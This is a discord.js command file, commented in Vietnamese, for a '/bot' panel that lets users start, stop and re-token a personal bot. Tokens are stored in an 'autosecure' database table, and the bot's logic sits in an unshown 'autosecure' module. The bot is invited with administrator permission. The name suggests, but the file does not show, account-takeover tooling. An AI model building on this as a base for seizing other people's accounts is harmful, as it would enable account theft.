const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require("discord.js");

const autosecure = require("../../../autosecure/autosecure");
const { queryParams } = require("../../../db/db");
const checkToken = require("../../utils/checkToken");
const { autosecureMap } = require("../../handlers/botHandler");

// Callback xử lý slash command và modal submit
async function callback(client, interaction) {
  // Xử lý modal submit token
  if (interaction.isModalSubmit() && interaction.customId === "modal_token_update") {
    return await handleModalSubmit(interaction);
  }

  // Slash command /bot
  if (interaction.isChatInputCommand()) {
    const embed = {
      title: "Configure Your Bot",
      description: "Utilize the buttons below to interact with your bot!",
      color: 0x00b0f4,
      footer: { text: "Choose wisely." },
      timestamp: new Date(),
    };

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("bot_start")
        .setLabel("Start")
        .setStyle(ButtonStyle.Success),

      new ButtonBuilder()
        .setCustomId("bot_stop")
        .setLabel("Stop")
        .setStyle(ButtonStyle.Danger),

      new ButtonBuilder()
        .setCustomId("bot_token")
        .setLabel("Token")
        .setStyle(ButtonStyle.Primary),

    );

    await interaction.reply({
      embeds: [embed],
      components: [row],
      ephemeral: true,
    });
  }
}

// Xử lý interaction button
async function buttonHandler(client, interaction) {
  switch (interaction.customId) {
    case "bot_start":
      return await handleStart(client, interaction);

    case "bot_stop":
      return await handleStop(client, interaction);

    case "bot_token":
      return await handleToken(client, interaction);

    default:
      return interaction.reply({ content: "Unknown action.", ephemeral: true });
  }
}

// Xử lý start bot
async function handleStart(client, interaction) {
  try {
    await interaction.deferReply({ ephemeral: true });

    let panel = await queryParams(
      `SELECT * FROM autosecure WHERE user_id=? LIMIT 1`,
      [interaction.user.id]
    );

    if (panel.length === 0) {
      return interaction.editReply({ content: `Bot not found.` });
    }

    panel = panel[0];

    if (!(await checkToken(panel.token))) {
      return interaction.editReply({ content: `Invalid bot token!` });
    }

    if (autosecureMap.has(`${interaction.user.id}`)) {
      let as = autosecureMap.get(`${interaction.user.id}`);
      return interaction.editReply({
        content: `Bot is already running.\n[Invite Bot](https://discord.com/oauth2/authorize?client_id=${as?.user?.id}&permissions=8&scope=bot+applications.commands)`,
      });
    }

    let as = await autosecure(panel.token, interaction.user.id);
    if (!as) {
      console.log(`[x] Invalid bot intents ${interaction.user.id}`);
      return interaction.editReply({
        content: `Please enable Intents in the Developer Portal.`,
      });
    }

    autosecureMap.set(`${interaction.user.id}`, as);

    return interaction.editReply({
      content: `Bot started successfully.\n[Invite Bot](https://discord.com/oauth2/authorize?client_id=${as.user.id}&permissions=8&scope=bot+applications.commands)`,
    });
  } catch (err) {
    console.error(err);
    return interaction.editReply({
      content: "An unknown error occurred while starting the bot.",
    });
  }
}

// Xử lý stop bot
async function handleStop(client, interaction) {
  try {
    let c = autosecureMap.get(interaction.user.id);
    if (c) {
      await c.destroy();
    } else {
      return interaction.reply({ content: `Your bot isn't started`, ephemeral: true });
    }
    autosecureMap.delete(interaction.user.id);
    return interaction.reply({ content: `Stopped your bot successfully`, ephemeral: true });
  } catch (e) {
    console.error(e);
    autosecureMap.delete(interaction.user.id);
    return interaction.reply({
      content: `Couldn't stop the bot!`,
      ephemeral: true,
    });
  }
}

// Xử lý mở modal nhập token
async function handleToken(client, interaction) {
  const modal = new ModalBuilder()
    .setCustomId("modal_token_update")
    .setTitle("Update Bot Token");

  const tokenInput = new TextInputBuilder()
    .setCustomId("token_input")
    .setLabel("Enter your new bot token")
    .setStyle(TextInputStyle.Short)
    .setPlaceholder("New bot token")
    .setRequired(true);

  const firstActionRow = new ActionRowBuilder().addComponents(tokenInput);
  modal.addComponents(firstActionRow);

  await interaction.showModal(modal);
}

// Xử lý submit modal token
async function handleModalSubmit(interaction) {
  const newToken = interaction.fields.getTextInputValue("token_input");

  if (!(await checkToken(newToken))) {
    return interaction.reply({
      content: "Invalid token provided, please try again.",
      ephemeral: true,
    });
  }

  try {
    await queryParams("UPDATE autosecure SET token=? WHERE user_id=?", [
      newToken,
      interaction.user.id,
    ]);
    return interaction.reply({
      content: "Your bot token has been updated successfully.",
      ephemeral: true,
    });
  } catch (error) {
    console.error(error);
    return interaction.reply({
      content: "Failed to update your token due to an error.",
      ephemeral: true,
    });
  }
}

module.exports = {
  name: "bot",
  description: "Configure Your Bot",
  userOnly: true,
  callback,
  buttonHandler,
  handleModalSubmit,
};